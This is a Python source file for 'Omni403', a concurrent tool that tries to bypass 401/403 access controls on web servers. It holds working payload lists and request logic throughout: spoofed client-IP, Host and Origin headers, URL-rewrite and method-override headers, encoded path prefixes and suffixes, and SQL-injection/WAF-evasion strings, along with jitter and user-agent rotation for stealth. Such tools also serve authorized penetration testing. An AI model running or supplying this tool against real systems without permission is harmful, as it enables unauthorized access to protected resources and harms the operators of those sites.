#!/usr/bin/env python3
import asyncio
import aiohttp
import argparse
import random
import sys
from urllib.parse import urlparse
from colorama import init, Fore, Style
import yarl

init(autoreset=True)

# ==========================================
# THE "GOD" WORDLIST (100% Exhaustive)
# ==========================================
IPS = [
    "127.0.0.1", "127.0.0.2", "127.1", "localhost", "0.0.0.0", "0", "0.0",
    "192.168.0.1", "10.0.0.1", "10.0.0.0", "172.16.0.1", "8.8.8.8", 
    "2130706433", "0177.0.0.1", "0x7f000001", "::1", "0:0:0:0:0:0:0:1", 
    "::ffff:127.0.0.1", "127.0.0.1:80", "127.0.0.1:443"
]

HEADERS = [
    "X-Forwarded-For", "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr",
    "X-Client-IP", "X-Host", "X-Forwarded-Host", "X-Custom-IP-Authorization",
    "True-Client-IP", "X-WAP-Profile", "X-Real-IP", "X-Forwarded-Server",
    "X-Forwarded-By", "X-Forwarded-For-Original", "Forwarded", "Client-IP",
    "Proxy-Host", "Proxy-Url", "Real-Ip", "Redirect", "Referrer", 
    "Request-Uri", "Uri", "Url", "CF-Connecting-IP", "CF-Connecting_IP",
    "X-Cluster-Client-IP", "WL-Proxy-Client-IP", "X-ProxyUser-Ip", "Base-Url", 
    "Http-Url", "Destination", "Proxy", "X-Original-Remote-Addr", "X-OReferrer",
    "X-Originally-Forwarded-For", "X-Forwarded", "X-Forwarder-For", "X-Original-IP"
]

REWRITE_HEADERS = [
    "X-Original-URL", "X-Rewrite-URL", "X-HTTP-DestinationURL", "X-Arbitrary", 
    "Profile", "From", "X-Http-Host-Override"
]

METHOD_OVERRIDE_HEADERS = [
    "X-HTTP-Method", "X-HTTP-Method-Override", "X-Method-Override"
]

PROTO_HEADERS = ["X-Forwarded-Proto", "X-Forwarded-Scheme"]
PROTOS = ["http", "https", "ws", "wss"]
PORT_HEADERS = ["X-Forwarded-Port"]
PORTS = ["80", "443", "8080", "8443", "4443"]

METHODS = [
    "GET", "POST", "HEAD", "OPTIONS", "PUT", "TRACE", "TRACK", "PATCH", 
    "CONNECT", "UPDATE", "LOCK", "INVENTED", "DEBUG", "HACK"
]

# Expanded Prefixes (Added Null bytes, CRLF, Backslashes, Double Encodings)
PREFIXES = [
    "/%2e", "/%2e%2e", "/;", "/%2f", "/./", "//", "/*", "/%09", "/%20", 
    "/~", "/.", "/..;/", "/.../", "/%u002e", "/%ef%bc%8f", ";x/", "/;x", 
    "/%20%23", "/%252e", "/%252f", "/%3b", "/%c0%af", "/%c0%ae", "/%e0%80%af",
    "/%252e%252e%252f", "/%252e%252f", "/%00", "/%0a", "/%0d", "/%0d%0a", "/%5c", "/%23", "/%3f"
]

# Expanded Suffixes (Added fragments, query strings, exact terminators)
SUFFIXES = [
    "/..;/", "/%2e%2e", ".json", ".html", ".css", "?.css", "?anything=1", 
    "#anything", "/%20", "%00", "%09", "?", "??", "///", "/.", ";", ";/",
    ";%09", ";%09..", ";%2f..", "%3b", "%3b%2f", "..;/", "..;", "/../",
    "/../../", "..%00/", "..%0d/", "..%5c/", "..%ff/", "%23", "%3f", ".php", ".xml",
    ".js", "%0a", "%0d", "%0d%0a", "/%5c", "/%252e"
]

SQLI_PAYLOADS = [
    "'%20or%201.e(%22)%3D'", "1.e(ascii", "1.e(substring("
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0"
]

# ==========================================
# Custom Help Manual
# ==========================================
def show_manual():
    print(f"{Fore.CYAN}===================================================================={Style.RESET_ALL}")
    print(f"{Fore.GREEN}💀 Omni403 - The Master Access Control Bypass Engine 💀{Style.RESET_ALL}")
    print(f"{Fore.CYAN}===================================================================={Style.RESET_ALL}\n")
    print(f"{Fore.YELLOW}DESCRIPTION:{Style.RESET_ALL}")
    print("  Omni403 is a highly concurrent, asynchronous 401/403 bypass tool.")
    print("  It combines every known bypass technique from byp4xx, dontgo403, nomore403, and 403bypasser into a single, stealthy matrix.\n")
    print(f"{Fore.YELLOW}MODULES EXECUTED DURING SCAN:{Style.RESET_ALL}")
    print("  1.  Method Tampering (GET, POST, TRACE, PATCH, INVENTED...)")
    print("  2.  IP & Proxy Spoofing Headers (X-Forwarded-For, True-Client-IP...)")
    print("  3.  Routing & Rewrite Headers (X-Rewrite-URL, X-Original-URL...)")
    print("  4.  Method Override Headers (X-HTTP-Method-Override...)")
    print("  5.  Protocol & Port Spoofing (X-Forwarded-Proto, X-Forwarded-Port...)")
    print("  6.  Origin Spoofing (null, localhost, 127.0.0.1...)")
    print("  7.  Host Header Manipulation (Trailing dot, localhost override...)")
    print("  8.  Anomalous Content Headers (Content-Length: 0 on GET...)")
    print("  9.  Path Prefixes (/%2e, /%252f, /%c0%af, /%00...)")
    print("  10. Path Suffixes (..;/, .json, %23, %00...)")
    print("  11. Prefix + Suffix Combinations")
    print("  12. Path Case Toggling (/admin -> /aDmIn)")
    print("  13. ModSec / SQLi Payloads\n")
    print(f"{Fore.YELLOW}USAGE:{Style.RESET_ALL}")
    print("  python3 omni403.py -u <URL> [OPTIONS]\n")
    print(f"{Fore.YELLOW}OPTIONS:{Style.RESET_ALL}")
    print("  -u, --url         Target URL (e.g., https://target.com/admin) [Required]")
    print("  -t, --threads     Max concurrent connections (Default: 50)")
    print("  -j, --jitter      Randomized delay up to X seconds (Default: 0.0s)")
    print("  -c, --cookie      Custom cookie string (e.g., 'session=123; user=admin')")
    print("  -fc, --filter-codes Comma separated status codes to ignore (Default: 400,401,403,404)")
    print("  -fs, --filter-size  Comma separated response lengths to ignore (e.g., '1434,502'). Overrides Auto-Calibration.")
    print("  -p, --proxy       Proxy URL (e.g., http://127.0.0.1:8080)")
    print("  -o, --output      File to save successful bypasses (e.g., results.txt)")
    print("  -h, --help        Show this manual\n")
    print(f"{Fore.YELLOW}EXAMPLES:{Style.RESET_ALL}")
    print("  1. Fast Internal Scan:")
    print(f"     {Fore.GREEN}python3 omni403.py -u https://target.internal/restricted -t 100{Style.RESET_ALL}")
    print("  2. Stealth Scan (WAF Active, Jitter enabled, Output saved):")
    print(f"     {Fore.GREEN}python3 omni403.py -u https://target.com/api/admin -t 10 -j 1.5 -o out.txt{Style.RESET_ALL}")
    print("  3. Filter specific status codes (Show 404s, hide 500s):")
    print(f"     {Fore.GREEN}python3 omni403.py -u https://target.com/admin -fc 400,401,403,500{Style.RESET_ALL}\n")
    sys.exit(0)

# ==========================================
# Core Functions
# ==========================================
async def fetch(session, method, url, headers, payload_desc, sem, jitter, filter_sizes, ignore_statuses, proxy, output_file):
    async with sem:
        if jitter > 0:
            await asyncio.sleep(random.uniform(0.05, jitter))
            
        try:
            raw_url = yarl.URL(url, encoded=True)
            async with session.request(method, raw_url, headers=headers, proxy=proxy, ssl=False, allow_redirects=False, timeout=8) as response:
                status = response.status
                body = await response.read()
                length = len(body)
                
                # Check for bypass success
                if status not in ignore_statuses and length not in filter_sizes:
                    color = Fore.GREEN if status in [200, 201] else Fore.YELLOW
                    result_text = f"{color}[{status}]{Style.RESET_ALL} {payload_desc}\n ╰─> {method} {url} (Len: {length})"
                    print(result_text)
                    
                    if output_file:
                        with open(output_file, 'a', encoding='utf-8') as f:
                            clean_text = f"[{status}] {payload_desc}\n ╰─> {method} {url} (Len: {length})\n"
                            f.write(clean_text)
                    
        except Exception:
            pass 

def toggle_case(path):
    if len(path) <= 1: return []
    res = []
    res.append("/" + path.lstrip('/')[0].upper() + path.lstrip('/')[1:])
    res.append("/" + "".join(random.choice([k.upper(), k.lower()]) for k in path.lstrip('/')))
    return res

async def main(target, concurrency, jitter, custom_cookies, filter_codes_str, manual_filter_sizes, proxy, output_file):
    parsed = urlparse(target)
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    domain = parsed.netloc
    path = parsed.path if parsed.path else "/"
    clean_path = path.lstrip('/')
    
    # Parse Filter Codes
    ignore_statuses = [int(code.strip()) for code in filter_codes_str.split(',')]
    
    print(f"{Fore.CYAN}💀 Omni403 - The Master Bypass Engine 💀{Style.RESET_ALL}")
    print(f"[*] Target: {target}")
    print(f"[*] Ignored Status Codes: {ignore_statuses}")
    if proxy:
        print(f"[*] Proxy Routed: {proxy}")
        
    filter_sizes = set()
    connector = aiohttp.TCPConnector(limit=concurrency, ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        
        # ==========================================
        # FILTER LOGIC (Manual Override vs Auto)
        # ==========================================
        if manual_filter_sizes:
            print(f"[*] Manual filter sizes provided (-fs). Skipping Auto-Calibration.")
            for size in manual_filter_sizes.split(","):
                filter_sizes.add(int(size.strip()))
        else:
            print(f"[*] Auto-Calibrating baselines to filter false positives...")
            base_headers = {"User-Agent": random.choice(USER_AGENTS)}
            if custom_cookies:
                base_headers["Cookie"] = custom_cookies

            try:
                async with session.get(base_url, headers=base_headers, proxy=proxy, ssl=False, allow_redirects=False) as r:
                    body = await r.read()
                    filter_sizes.add(len(body))
                    print(f"[-] Ignored Root (/) Length: {len(body)} bytes")
            except: pass

            try:
                async with session.get(target, headers=base_headers, proxy=proxy, ssl=False, allow_redirects=False) as r:
                    body = await r.read()
                    filter_sizes.add(len(body))
                    print(f"[-] Ignored Target Failure Length: {len(body)} bytes")
            except: pass
        
        print(f"[*] Total Filtered Lengths: {list(filter_sizes)}")
        print(f"[*] Concurrency: {concurrency} | Max Jitter: {jitter}s")
        print(f"[*] Generating absolute payload matrix...\n")

        sem = asyncio.Semaphore(concurrency)
        tasks = []

        def add_task(req_method, req_url, req_headers, desc):
            req_headers["User-Agent"] = random.choice(USER_AGENTS)
            if custom_cookies:
                req_headers["Cookie"] = custom_cookies
            tasks.append(fetch(session, req_method, req_url, req_headers, desc, sem, jitter, filter_sizes, ignore_statuses, proxy, output_file))

        # 1. METHOD TAMPERING
        for method in METHODS:
            add_task(method, target, {}, f"Method Tampering: {method}")

        # 2. IP SPOOFING HEADERS
        for header in HEADERS:
            for ip in IPS:
                add_task("GET", target, {header: ip}, f"Header Spoof: {header}: {ip}")
                add_task("GET", target, {header: f"{ip}, {ip}"}, f"Header Stacked: {header}: {ip}, {ip}")

        # 3. REWRITE HEADERS
        for header in REWRITE_HEADERS:
            add_task("GET", base_url, {header: path}, f"Rewrite Spoof: {header}: {path}")

        # 4. METHOD OVERRIDE HEADERS
        for header in METHOD_OVERRIDE_HEADERS:
            for m in ["GET", "POST", "PUT", "PATCH"]:
                add_task("GET", target, {header: m}, f"Method Override Spoof: {header}: {m}")
                add_task("POST", target, {header: m}, f"Method Override Spoof: POST + {header}: {m}")

        # 5. PROTOCOL & PORT SPOOFING
        for header in PROTO_HEADERS:
            for proto in PROTOS:
                add_task("GET", target, {header: proto}, f"Proto Spoof: {header}: {proto}")
        for header in PORT_HEADERS:
            for port in PORTS:
                add_task("GET", target, {header: port}, f"Port Spoof: {header}: {port}")

        # 6. ORIGIN SPOOFING
        origins = ["http://localhost", "https://localhost", "http://127.0.0.1", "null", base_url]
        for origin in origins:
             add_task("GET", target, {"Origin": origin}, f"Origin Spoof: Origin: {origin}")

        # 7. HOST HEADER MANIPULATION
        add_task("GET", target, {"Host": "localhost"}, f"Host Override: localhost")
        add_task("GET", target, {"Host": "127.0.0.1"}, f"Host Override: 127.0.0.1")
        add_task("GET", target, {"Host": f"{domain}."}, f"Host Trailing Dot: {domain}.")
        
        # 8. ANOMALOUS CONTENT HEADERS
        add_task("GET", target, {"Content-Length": "0"}, f"Anomalous Header: Content-Length: 0 on GET")
        add_task("GET", target, {"Content-Type": "application/json"}, f"Anomalous Header: Content-Type JSON on GET")

        # 9. PATH PREFIXES
        for prefix in PREFIXES:
            spoofed_url = f"{base_url}{prefix}/{clean_path}"
            add_task("GET", spoofed_url, {}, f"Path Prefix: {prefix}")

        # 10. PATH SUFFIXES
        for suffix in SUFFIXES:
            spoofed_url = f"{target}{suffix}"
            add_task("GET", spoofed_url, {}, f"Path Suffix: {suffix}")
            
        # 11. DOUBLE COMBINATIONS
        for prefix in ["/%2e", "/;", "/./", "//", "/%c0%af"]:
            for suffix in [".json", "/..;/", ";", "%20", "%00"]:
                spoofed_url = f"{base_url}{prefix}/{clean_path}{suffix}"
                add_task("GET", spoofed_url, {}, f"Combo: Prefix {prefix} + Suffix {suffix}")

        # 12. CASE TOGGLING
        for cased_path in toggle_case(path):
            spoofed_url = f"{base_url}{cased_path}"
            add_task("GET", spoofed_url, {}, f"Case Toggling: {cased_path}")

        # 13. SQLi / WAF BYPASS
        for sqli in SQLI_PAYLOADS:
            spoofed_url = f"{target}{sqli}"
            add_task("GET", spoofed_url, {}, f"ModSec/SQLi Payload: {sqli}")

        print(f"[*] Queue generated: {len(tasks)} requests ready. Firing...")
        await asyncio.gather(*tasks)
        
    print(f"\n{Fore.GREEN}[+] Scan Complete.{Style.RESET_ALL}")

if __name__ == "__main__":
    # Disable default help so we can use our custom manual
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("-h", "--help", action="store_true")
    parser.add_argument("-u", "--url", type=str)
    parser.add_argument("-t", "--threads", type=int, default=50)
    parser.add_argument("-j", "--jitter", type=float, default=0.0)
    parser.add_argument("-c", "--cookie", type=str, default="")
    parser.add_argument("-fc", "--filter-codes", type=str, default="400,401,403,404")
    parser.add_argument("-fs", "--filter-size", type=str, default="")
    parser.add_argument("-p", "--proxy", type=str, default="")
    parser.add_argument("-o", "--output", type=str, default="")
    
    args = parser.parse_args()
    
    if args.help or not args.url:
        show_manual()
        
    if sys.platform.startswith("win"):
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        
    asyncio.run(main(args.url, args.threads, args.jitter, args.cookie, args.filter_codes, args.filter_size, args.proxy, args.output))
